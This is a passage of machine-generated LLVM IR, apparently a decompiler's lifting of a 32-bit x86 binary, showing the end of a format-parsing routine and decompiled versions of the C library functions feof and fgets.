  %v8_804b149 = icmp sgt i32 %v0_804b147.pre, %v3_804b144
  br i1 %v8_804b149, label %dec_label_pc_804b143, label %dec_label_pc_804b14b

dec_label_pc_804b14b:                             ; preds = %dec_label_pc_804b143
  store i32 ptrtoint ([21 x i8]* @global_var_8051835.329 to i32), i32* @ecx, align 4
  %v1_804b152 = add i32 %v0_804b143, -134551595
  store i32 %v1_804b152, i32* %eax.global-to-local, align 4
  %v2_804b157 = add i32 %v0_804b143, add (i32 ptrtoint (i32* @global_var_805181c.331 to i32), i32 -134551595)
  %v3_804b157 = add i32 %v2_804b157, %v1_804b152
  %v4_804b157 = inttoptr i32 %v3_804b157 to i16*
  %v5_804b157 = load i16, i16* %v4_804b157, align 2
  %v6_804b157 = sext i16 %v5_804b157 to i32
  store i32 %v6_804b157, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804b152, 2
  %v3_804b15f = add i32 %factor, 134551564
  %v4_804b15f = inttoptr i32 %v3_804b15f to i16*
  %v5_804b15f = load i16, i16* %v4_804b15f, align 2
  %v6_804b15f = sext i16 %v5_804b15f to i32
  store i32 %v6_804b15f, i32* %eax.global-to-local, align 4
  %v1_804b167 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b167 = or i32 %v1_804b167, %v6_804b157
  %v2_804b169 = and i32 %v2_804b167, %v6_804b15f
  store i32 %v2_804b169, i32* %edx.global-to-local, align 4
  %v0_804b17b.pre = load i32, i32* @esi, align 4
  %v0_804b17e.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804b173

dec_label_pc_804b16d:                             ; preds = %dec_label_pc_804b11d
  %v1_804b16d = add i32 %v0_804b16d, 1
  store i32 %v1_804b16d, i32* @ecx, align 4
  %v1_804b16e = inttoptr i32 %v1_804b16d to i8*
  %v2_804b16e = load i8, i8* %v1_804b16e, align 1
  %v3_804b16e = icmp eq i8 %v2_804b16e, 0
  %v1_804b171 = icmp eq i1 %v3_804b16e, false
  br i1 %v1_804b171, label %dec_label_pc_804b11d, label %dec_label_pc_804b173

dec_label_pc_804b173:                             ; preds = %dec_label_pc_804b16d, %dec_label_pc_804b14b
  %v0_804b17e = phi i32 [ %v0_804b17e.pre, %dec_label_pc_804b14b ], [ %storemerge4, %dec_label_pc_804b16d ]
  %v0_804b17b = phi i32 [ %v0_804b17b.pre, %dec_label_pc_804b14b ], [ %v0_804b107, %dec_label_pc_804b16d ]
  %v0_804b173 = phi i32 [ %v2_804b169, %dec_label_pc_804b14b ], [ %v3_804b114, %dec_label_pc_804b16d ]
  store i32 %v0_804b173, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804b17b = inttoptr i32 %v0_804b17b to i8*
  %v2_804b17b = load i8, i8* %v1_804b17b, align 1
  %v3_804b17b = sext i8 %v2_804b17b to i32
  store i32 %v3_804b17b, i32* %eax.global-to-local, align 4
  %v2_804b17e = add i32 %tmp76, 4
  %v3_804b17e = inttoptr i32 %v2_804b17e to i32*
  store i32 %v0_804b17e, i32* %v3_804b17e, align 4
  %v0_804b181 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b181 = load i32, i32* @edx, align 4
  %v2_804b181 = add i32 %v1_804b181, 12
  %v3_804b181 = inttoptr i32 %v2_804b181 to i32*
  store i32 %v0_804b181, i32* %v3_804b181, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804b188 = load i32, i32* @edx, align 4
  %v1_804b188 = add i32 %v0_804b188, 28
  %v2_804b188 = inttoptr i32 %v1_804b188 to i32*
  store i32 1, i32* %v2_804b188, align 4
  %v0_804b18f = load i32, i32* %eax.global-to-local, align 4
  %v1_804b18f = load i32, i32* @edx, align 4
  %v2_804b18f = add i32 %v1_804b18f, 8
  %v3_804b18f = inttoptr i32 %v2_804b18f to i32*
  store i32 %v0_804b18f, i32* %v3_804b18f, align 4
  %v0_804b192 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b19c = and i32 %v0_804b192, -5
  %v0_804b1a2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b1a2 = and i32 %v0_804b1a2, 3840
  store i32 %v1_804b1a2, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804b1ab = or i32 %v1_804b1a2, %v1_804b19c
  store i32 %v2_804b1ab, i32* @edi, align 4
  %v1_804b1ad = load i32, i32* @edx, align 4
  %v2_804b1ad = add i32 %v1_804b1ad, 20
  %v3_804b1ad = inttoptr i32 %v2_804b1ad to i32*
  store i32 48, i32* %v3_804b1ad, align 4
  %v0_804b1b0 = load i32, i32* @edi, align 4
  %v1_804b1b0 = load i32, i32* @edx, align 4
  %v2_804b1b0 = add i32 %v1_804b1b0, 16
  %v3_804b1b0 = inttoptr i32 %v2_804b1b0 to i32*
  store i32 %v0_804b1b0, i32* %v3_804b1b0, align 4
  %v0_804b1b3 = load i32, i32* @ecx, align 4
  %v1_804b1b3 = inttoptr i32 %v0_804b1b3 to i8*
  %v2_804b1b3 = load i8, i8* %v1_804b1b3, align 1
  %v3_804b1b3 = icmp eq i8 %v2_804b1b3, 0
  %v1_804b1b6 = icmp eq i1 %v3_804b1b3, false
  br i1 %v1_804b1b6, label %dec_label_pc_804b1cf, label %dec_label_pc_804b1b8

dec_label_pc_804b1b8:                             ; preds = %dec_label_pc_804b173
  %v0_804b1b8 = load i32, i32* @esi, align 4
  %v1_804b1b8 = inttoptr i32 %v0_804b1b8 to i8*
  %v2_804b1b8 = load i8, i8* %v1_804b1b8, align 1
  %v11_804b1b8 = icmp eq i8 %v2_804b1b8, 109
  %v1_804b1bb = icmp eq i1 %v11_804b1b8, false
  br i1 %v1_804b1bb, label %dec_label_pc_804b2c9, label %dec_label_pc_804b1c1

dec_label_pc_804b1c1:                             ; preds = %dec_label_pc_804b1b8
  %v0_804b1c1 = load i32, i32* @edx, align 4
  %v1_804b1c1 = add i32 %v0_804b1c1, 32
  %v2_804b1c1 = inttoptr i32 %v1_804b1c1 to i32*
  store i32 20, i32* %v2_804b1c1, align 4
  %v0_804b1c8 = load i32, i32* @edx, align 4
  %v1_804b1c8 = add i32 %v0_804b1c8, 28
  %v2_804b1c8 = inttoptr i32 %v1_804b1c8 to i32*
  store i32 0, i32* %v2_804b1c8, align 4
  br label %dec_label_pc_804b1cf

dec_label_pc_804b1cf:                             ; preds = %dec_label_pc_804b173, %dec_label_pc_804b1c1
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804b26b, label %dec_label_pc_804b1da

dec_label_pc_804b1da:                             ; preds = %dec_label_pc_804b1cf
  store i32 0, i32* %ebp.global-to-local, align 4
  %v4_804b253 = add i32 %tmp76, 40
  %v4_804b1e9 = add i32 %tmp76, 36
  %v1_804b25c = add i32 %tmp76, 28
  %v2_804b25c = inttoptr i32 %v1_804b25c to i32*
  br label %dec_label_pc_804b1dc

dec_label_pc_804b1dc:                             ; preds = %dec_label_pc_804b257, %dec_label_pc_804b1da
  %v0_804b1f2 = phi i32 [ 0, %dec_label_pc_804b1da ], [ %v1_804b25b, %dec_label_pc_804b257 ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804b1da ], [ %stack_var_-88.5, %dec_label_pc_804b257 ]
  %v1_804b1dc = add i32 %v0_804b1f2, -2
  %v6_804b1dc = sub i32 1, %v0_804b1f2
  %v7_804b1dc = and i32 %v6_804b1dc, %v0_804b1f2
  %v8_804b1dc = icmp slt i32 %v7_804b1dc, 0
  %v9_804b1dc = icmp eq i32 %v1_804b1dc, 0
  %v10_804b1dc = icmp slt i32 %v1_804b1dc, 0
  %v3_804b1df = icmp eq i1 %v10_804b1dc, %v8_804b1dc
  %v4_804b1df = icmp eq i1 %v9_804b1dc, false
  %v5_804b1df = and i1 %v4_804b1df, %v3_804b1df
  br i1 %v5_804b1df, label %dec_label_pc_804b1f2, label %dec_label_pc_804b1e1

dec_label_pc_804b1e1:                             ; preds = %dec_label_pc_804b1dc
  %v0_804b1e1 = load i32, i32* @esp, align 4
  %v2_804b1e1 = mul i32 %v0_804b1f2, 4
  %v3_804b1e1 = add i32 %v2_804b1e1, 68
  %v4_804b1e1 = add i32 %v3_804b1e1, %v0_804b1e1
  %v5_804b1e1 = inttoptr i32 %v4_804b1e1 to i32*
  %v6_804b1e1 = load i32, i32* %v5_804b1e1, align 4
  store i32 %v6_804b1e1, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804b1e9 = trunc i32 %v6_804b1e1 to i8
  %v5_804b1e9 = add i32 %v4_804b1e9, %v0_804b1f2
  %v6_804b1e9 = inttoptr i32 %v5_804b1e9 to i8*
  store i8 %v1_804b1e9, i8* %v6_804b1e9, align 1
  %v0_804b1ed = load i32, i32* %eax.global-to-local, align 4
  %v1_804b1ed = urem i32 %v0_804b1ed, 256
  br label %dec_label_pc_804b1fb

dec_label_pc_804b1f2:                             ; preds = %dec_label_pc_804b1dc
  %v5_804b1f4 = add i32 %v0_804b1f2, %stack_var_-32.3
  store i32 %v5_804b1f4, i32* %eax.global-to-local, align 4
  %v1_804b1f8 = add i32 %v5_804b1f4, -2
  br label %dec_label_pc_804b1fb

dec_label_pc_804b1fb:                             ; preds = %dec_label_pc_804b1e1, %dec_label_pc_804b1f2
  %v0_804b20e = phi i32 [ %v1_804b1ed, %dec_label_pc_804b1e1 ], [ %v1_804b1f8, %dec_label_pc_804b1f2 ]
  store i32 %v0_804b20e, i32* %eax.global-to-local, align 4
  %v5_804b1fb = sub i32 %v0_804b20e, %stack_var_-88.4
  %v11_804b1fb = xor i32 %v0_804b20e, %stack_var_-88.4
  %v12_804b1fb = xor i32 %v5_804b1fb, %v0_804b20e
  %v13_804b1fb = and i32 %v12_804b1fb, %v11_804b1fb
  %v14_804b1fb = icmp slt i32 %v13_804b1fb, 0
  %v15_804b1fb = icmp eq i32 %v5_804b1fb, 0
  %v16_804b1fb = icmp slt i32 %v5_804b1fb, 0
  %v3_804b1ff = icmp ne i1 %v16_804b1fb, %v14_804b1fb
  %v4_804b1ff = or i1 %v15_804b1fb, %v3_804b1ff
  br i1 %v4_804b1ff, label %dec_label_pc_804b20e, label %dec_label_pc_804b201

dec_label_pc_804b201:                             ; preds = %dec_label_pc_804b1fb
  %v1_804b201 = add i32 %v0_804b20e, -9
  %v6_804b201 = sub i32 8, %v0_804b20e
  %v7_804b201 = and i32 %v6_804b201, %v0_804b20e
  %v8_804b201 = icmp slt i32 %v7_804b201, 0
  %v9_804b201 = icmp eq i32 %v1_804b201, 0
  %v10_804b201 = icmp slt i32 %v1_804b201, 0
  %v3_804b204 = icmp eq i1 %v10_804b201, %v8_804b201
  %v4_804b204 = icmp eq i1 %v9_804b201, false
  %v5_804b204 = and i1 %v4_804b204, %v3_804b204
  br i1 %v5_804b204, label %dec_label_pc_804b2c9, label %dec_label_pc_804b20e

dec_label_pc_804b20e:                             ; preds = %dec_label_pc_804b201, %dec_label_pc_804b1fb
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804b1fb ], [ %v0_804b20e, %dec_label_pc_804b201 ]
  %v1_804b20e = add i32 %v0_804b20e, -1
  store i32 %v1_804b20e, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804b217 = load i32, i32* @esp, align 4
  %v1_804b217 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b217 = mul i32 %v1_804b217, 4
  %v3_804b217 = add i32 %v0_804b217, 80
  %v4_804b217 = add i32 %v3_804b217, %v2_804b217
  %v5_804b217 = inttoptr i32 %v4_804b217 to i32*
  %v6_804b217 = load i32, i32* %v5_804b217, align 4
  store i32 %v6_804b217, i32* %edi.global-to-local, align 4
  %v2_804b21b = mul i32 %v1_804b20e, 4
  %v4_804b21b = add i32 %v4_804b253, %v2_804b21b
  %v5_804b21b = inttoptr i32 %v4_804b21b to i32*
  %v6_804b21b = load i32, i32* %v5_804b21b, align 4
  store i32 %v6_804b21b, i32* @eax, align 4
  %v9_804b21f = icmp eq i32 %v6_804b217, 8
  br i1 %v9_804b21f, label %dec_label_pc_804b257, label %dec_label_pc_804b224

dec_label_pc_804b224:                             ; preds = %dec_label_pc_804b20e
  %v9_804b224 = icmp eq i32 %v6_804b21b, 8
  br i1 %v9_804b224, label %dec_label_pc_804b247, label %dec_label_pc_804b229

dec_label_pc_804b229:                             ; preds = %dec_label_pc_804b224
  %v12_804b229 = icmp eq i32 %v6_804b21b, %v6_804b217
  br i1 %v12_804b229, label %dec_label_pc_804b247, label %dec_label_pc_804b22d

dec_label_pc_804b22d:                             ; preds = %dec_label_pc_804b229
  %v1_804b22d = call i32 @_promoted_size(i32 %v1_804b20e)
  store i32 %v1_804b22d, i32* %ebx.global-to-local, align 4
  %v0_804b234 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804b234, i32* @eax, align 4
  %v1_804b236 = call i32 @_promoted_size(i32 %v1_804b20e)
  %v2_804b23b = sub i32 %v1_804b22d, %v1_804b236
  %v8_804b23b = xor i32 %v1_804b22d, %v1_804b236
  %v9_804b23b = xor i32 %v2_804b23b, %v1_804b22d
  %v10_804b23b = and i32 %v9_804b23b, %v8_804b23b
  %v11_804b23b = icmp slt i32 %v10_804b23b, 0
  %v12_804b23b = icmp eq i32 %v2_804b23b, 0
  %v13_804b23b = icmp slt i32 %v2_804b23b, 0
  %v3_804b23d = icmp ne i1 %v13_804b23b, %v11_804b23b
  %v4_804b23d = or i1 %v12_804b23b, %v3_804b23d
  %v5_804b23d = zext i1 %v4_804b23d to i32
  store i32 %v5_804b23d, i32* %eax.global-to-local, align 4
  %v1_804b243 = icmp eq i1 %v4_804b23d, false
  br i1 %v1_804b243, label %dec_label_pc_804b257, label %dec_label_pc_804b22d.dec_label_pc_804b247_crit_edge

dec_label_pc_804b22d.dec_label_pc_804b247_crit_edge: ; preds = %dec_label_pc_804b22d
  %v0_804b247.pre = load i32, i32* @esp, align 4
  %v1_804b247.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804b247

dec_label_pc_804b247:                             ; preds = %dec_label_pc_804b22d.dec_label_pc_804b247_crit_edge, %dec_label_pc_804b229, %dec_label_pc_804b224
  %v1_804b247 = phi i32 [ %v1_804b247.pre, %dec_label_pc_804b22d.dec_label_pc_804b247_crit_edge ], [ %v1_804b217, %dec_label_pc_804b229 ], [ %v1_804b217, %dec_label_pc_804b224 ]
  %v0_804b247 = phi i32 [ %v0_804b247.pre, %dec_label_pc_804b22d.dec_label_pc_804b247_crit_edge ], [ %v0_804b217, %dec_label_pc_804b229 ], [ %v0_804b217, %dec_label_pc_804b224 ]
  %v2_804b247 = mul i32 %v1_804b247, 4
  %v3_804b247 = add i32 %v0_804b247, 80
  %v4_804b247 = add i32 %v3_804b247, %v2_804b247
  %v5_804b247 = inttoptr i32 %v4_804b247 to i32*
  %v6_804b247 = load i32, i32* %v5_804b247, align 4
  store i32 %v6_804b247, i32* %eax.global-to-local, align 4
  store i32 %v1_804b20e, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  store i32 %v6_804b247, i32* %v5_804b21b, align 4
  br label %dec_label_pc_804b257

dec_label_pc_804b257:                             ; preds = %dec_label_pc_804b22d, %dec_label_pc_804b20e, %dec_label_pc_804b247
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804b25b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b25b = add i32 %v0_804b25b, 1
  store i32 %v1_804b25b, i32* %ebp.global-to-local, align 4
  %v3_804b25c = load i32, i32* %v2_804b25c, align 4
  %v1_804b25f = add i32 %v3_804b25c, 2
  store i32 %v1_804b25f, i32* %eax.global-to-local, align 4
  %v5_804b264 = icmp slt i32 %v1_804b25b, %v1_804b25f
  br i1 %v5_804b264, label %dec_label_pc_804b1dc, label %dec_label_pc_804b292

dec_label_pc_804b26b:                             ; preds = %dec_label_pc_804b1cf
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804b26f = add i32 %tmp76, 38
  %v2_804b26f = inttoptr i32 %v1_804b26f to i8*
  store i8 1, i8* %v2_804b26f, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804b278 = add i32 %tmp76, 28
  %v2_804b278 = inttoptr i32 %v1_804b278 to i32*
  %v3_804b278 = load i32, i32* %v2_804b278, align 4
  %v2_804b27b = mul i32 %v3_804b278, 4
  %v2_804b27f = ptrtoint i32* %stack_var_-20 to i32
  %v1_804b286 = add i32 %tmp76, 40
  store i32 %v1_804b286, i32* %eax.global-to-local, align 4
  %v3_804b28a = inttoptr i32 %v1_804b286 to i16*
  %v4_804b28a = call i32 @memcpy(i16* %v3_804b28a, i32 %v2_804b27f, i32 %v2_804b27b)
  store i32 %v4_804b28a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b292

dec_label_pc_804b292:                             ; preds = %dec_label_pc_804b257, %dec_label_pc_804b26b
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804b26b ], [ %stack_var_-88.5, %dec_label_pc_804b257 ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  %v2_804b29a = inttoptr i32 %v1_804af3b to i8*
  %v3_804b29a = load i8, i8* %v2_804b29a, align 1
  %v5_804b29a = icmp slt i8 %v3_804b29a, 0
  store i32 %stack_var_-88.6, i32* %v2_804af34, align 4
  br i1 %v5_804b29a, label %dec_label_pc_804b2aa, label %dec_label_pc_804b2a3

dec_label_pc_804b2a3:                             ; preds = %dec_label_pc_804b292
  %v0_804b2a3 = load i32, i32* @esi, align 4
  %v1_804b2a3 = add i32 %v0_804b2a3, 1
  store i32 %v1_804b2a3, i32* %eax.global-to-local, align 4
  %v1_804b2a6 = load i32, i32* @ecx, align 4
  %v2_804b2a6 = inttoptr i32 %v1_804b2a6 to i32*
  store i32 %v1_804b2a3, i32* %v2_804b2a6, align 4
  br label %dec_label_pc_804b2bd

dec_label_pc_804b2aa:                             ; preds = %dec_label_pc_804b292
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %v4_804af08, i32* %edx.global-to-local, align 4
  %v0_804b2b2 = load i32, i32* @esi, align 4
  %v2_804b2b2 = sub i32 %v0_804b2b2, %v4_804af08
  store i32 %v2_804b2b2, i32* %esi.global-to-local, align 4
  %v1_804b2b4 = mul i32 %v2_804b2b2, 4
  %v2_804b2b4 = add i32 %v1_804b2b4, 224
  store i32 %v2_804b2b4, i32* %eax.global-to-local, align 4
  %v2_804b2bb = load i32, i32* %arg1, align 4
  %v4_804b2bb = add i32 %v2_804b2bb, %v2_804b2b4
  store i32 %v4_804b2bb, i32* %arg1, align 4
  br label %dec_label_pc_804b2bd

dec_label_pc_804b2bd:                             ; preds = %dec_label_pc_804b2a3, %dec_label_pc_804b2aa
  store i32 %tmp76, i32* @edx, align 4
  %v1_804b2c1 = add i32 %tmp76, 28
  %v2_804b2c1 = inttoptr i32 %v1_804b2c1 to i32*
  %v3_804b2c1 = load i32, i32* %v2_804b2c1, align 4
  store i32 %v3_804b2c1, i32* %eax.global-to-local, align 4
  %v1_804b2c4 = add i32 %v3_804b2c1, 2
  br label %dec_label_pc_804b2cc

dec_label_pc_804b2c9:                             ; preds = %dec_label_pc_804af59, %dec_label_pc_804aff3, %dec_label_pc_804b026, %dec_label_pc_804b0a1, %dec_label_pc_804b08d, %dec_label_pc_804b084, %dec_label_pc_804b201, %dec_label_pc_804b1b8, %dec_label_pc_804b103
  br label %dec_label_pc_804b2cc

dec_label_pc_804b2cc:                             ; preds = %dec_label_pc_804b2bd, %dec_label_pc_804b2c9
  %storemerge6 = phi i32 [ %v1_804b2c4, %dec_label_pc_804b2bd ], [ -1, %dec_label_pc_804b2c9 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804b2cf = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b2cf, i32* @ebx, align 4
  store i32 %v0_804af07, i32* @esi, align 4
  store i32 %v0_804af06, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %v1_804b25b, { 0, 2, 1 }
  uselistorder i32 %v2_804b23b, { 1, 2, 0 }
  uselistorder i32 %v1_804b22d, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804b20e, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804b201, { 1, 0 }
  uselistorder i32 %v5_804b1fb, { 1, 2, 0 }
  uselistorder i32 %v0_804b20e, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804b1dc, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804b1f2, { 0, 2, 3, 1, 5, 4 }
  uselistorder i32 %v1_804b16d, { 1, 2, 0 }
  uselistorder i32 %v1_804b143, { 1, 2, 0 }
  uselistorder i32 %v0_804b16d, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804b109, { 1, 0 }
  uselistorder i32 %v1_804b0f6, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804b0ff, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804b0e9, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804b0df, { 1, 0 }
  uselistorder i32 %v1_804b0c1, { 1, 0 }
  uselistorder i32 %v0_804b0df.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804b0a4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_804b09b, { 1, 2, 0 }
  uselistorder i32 %v0_804b061, { 1, 0 }
  uselistorder i32 %v1_804b053, { 1, 0 }
  uselistorder i32 %v1_804b04e, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804b04c, { 2, 0, 1 }
  uselistorder i32 %v0_804b06e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804b009, { 1, 2, 0 }
  uselistorder i32 %v0_804afe1, { 1, 2, 3, 6, 0, 4, 5, 7 }
  uselistorder i32 %v2_804afd7, { 1, 2, 0 }
  uselistorder i32 %v6_804afd5, { 0, 2, 1 }
  uselistorder i32 %v0_804afd4, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v1_804afcd, { 1, 2, 3, 9, 7, 4, 5, 8, 6, 11, 12, 10, 0, 13 }
  uselistorder i32 %v3_804afcd, { 2, 1, 0 }
  uselistorder i32 %v1_804afc5, { 1, 0 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v8_804afab, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804af81, { 0, 2, 1 }
  uselistorder i32 %v0_804af6e, { 2, 0, 1 }
  uselistorder i32 %v4_804af08, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 0, 20, 19, 18, 17, 16, 14, 13, 12, 1, 3, 15, 2, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 35, 31, 30, 32, 33, 36, 34, 42, 37, 38, 39, 40, 41, 43, 44 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 4, 1, 2, 3, 0 }
  uselistorder i32 -134551595, { 1, 0 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_8051835.329 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804b2cc, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c9, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804b2bd, { 1, 0 }
  uselistorder label %dec_label_pc_804b292, { 1, 0 }
  uselistorder label %dec_label_pc_804b257, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b1fb, { 1, 0 }
  uselistorder label %dec_label_pc_804b1cf, { 1, 0 }
  uselistorder label %dec_label_pc_804b137, { 1, 0 }
  uselistorder label %dec_label_pc_804b103, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804b0da, { 1, 0 }
  uselistorder label %dec_label_pc_804b0b1, { 1, 0 }
  uselistorder label %dec_label_pc_804b078, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804b01b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804afd5, { 1, 0 }
  uselistorder label %dec_label_pc_804afd4, { 1, 0 }
  uselistorder label %dec_label_pc_804afbb, { 1, 0 }
  uselistorder label %dec_label_pc_804afa4, { 1, 0 }
  uselistorder label %dec_label_pc_804afa4.outer, { 2, 0, 1 }
}

define i32 @feof(i16* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v12_804b2d7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b2da = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b2da, i32* %esi.global-to-local, align 4
  %v1_804b2de = add i32 %v4_804b2da, 52
  %v2_804b2de = inttoptr i32 %v1_804b2de to i32*
  %v3_804b2de = load i32, i32* %v2_804b2de, align 4
  %v1_804b2e1 = icmp eq i32 %v3_804b2de, 0
  %v1_804b2e3 = icmp eq i1 %v1_804b2e1, false
  br i1 %v1_804b2e3, label %dec_label_pc_804b304, label %dec_label_pc_804b2e5

dec_label_pc_804b2e5:                             ; preds = %entry
  %v1_804b2e5 = add i32 %v4_804b2da, 56
  store i32 %v1_804b2e5, i32* %ebx.global-to-local, align 4
  store i32 %v12_804b2d7, i32* @eax, align 4
  %v2_804b2f4 = call i32 @__pthread_return_void(i32 %v12_804b2d7, i32 134535499)
  %v1_804b2fc = call i32 @__pthread_return_0(i32 %v1_804b2e5)
  %v0_804b306.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b304

dec_label_pc_804b304:                             ; preds = %entry, %dec_label_pc_804b2e5
  %v0_804b306 = phi i32 [ %v4_804b2da, %entry ], [ %v0_804b306.pre, %dec_label_pc_804b2e5 ]
  %v1_804b306 = inttoptr i32 %v0_804b306 to i16*
  %v2_804b306 = load i16, i16* %v1_804b306, align 2
  %v3_804b306 = zext i16 %v2_804b306 to i32
  store i32 %v3_804b306, i32* %ebx.global-to-local, align 4
  br i1 %v1_804b2e3, label %dec_label_pc_804b31c, label %dec_label_pc_804b30b

dec_label_pc_804b30b:                             ; preds = %dec_label_pc_804b304
  store i32 %v12_804b2d7, i32* @eax, align 4
  %v2_804b314 = call i32 @__pthread_return_void(i32 %v12_804b2d7, i32 1)
  %v0_804b31f.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b31c

dec_label_pc_804b31c:                             ; preds = %dec_label_pc_804b304, %dec_label_pc_804b30b
  %v0_804b31f = phi i32 [ %v3_804b306, %dec_label_pc_804b304 ], [ %v0_804b31f.pre, %dec_label_pc_804b30b ]
  %v1_804b31f = and i32 %v0_804b31f, 4
  ret i32 %v1_804b31f

; uselistorder directives
  uselistorder i32 %v12_804b2d7, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804b31c, { 1, 0 }
  uselistorder label %dec_label_pc_804b304, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_804b328 = load i32, i32* @edi, align 4
  %v0_804b329 = load i32, i32* @esi, align 4
  %v0_804b32a = load i32, i32* @ebx, align 4
  %v12_804b32b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %arg3, i32* @esi, align 4
  %v1_804b332 = add i32 %arg3, 52
  %v2_804b332 = inttoptr i32 %v1_804b332 to i32*
  %v3_804b332 = load i32, i32* %v2_804b332, align 4
  store i32 %v3_804b332, i32* @edi, align 4
  %v1_804b335 = icmp eq i32 %v3_804b332, 0
  %v1_804b337 = icmp eq i1 %v1_804b335, false
  br i1 %v1_804b337, label %entry.dec_label_pc_804b358_crit_edge, label %dec_label_pc_804b339

entry.dec_label_pc_804b358_crit_edge:             ; preds = %entry
  br label %dec_label_pc_804b358

dec_label_pc_804b339:                             ; preds = %entry
  %v1_804b339 = add i32 %arg3, 56
  store i32 %v1_804b339, i32* @ebx, align 4
  store i32 %v12_804b32b, i32* @eax, align 4
  %v2_804b348 = call i32 @__pthread_return_void(i32 %v12_804b32b, i32 134535499)
  %v0_804b34d = load i32, i32* @ebx, align 4
  %v1_804b350 = call i32 @__pthread_return_0(i32 %v0_804b34d)
  %v0_804b359.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b358

dec_label_pc_804b358:                             ; preds = %entry.dec_label_pc_804b358_crit_edge, %dec_label_pc_804b339
  %v0_804b359 = phi i32 [ %arg3, %entry.dec_label_pc_804b358_crit_edge ], [ %v0_804b359.pre, %dec_label_pc_804b339 ]
  %v0_804b358 = load i32, i32* @edx, align 4
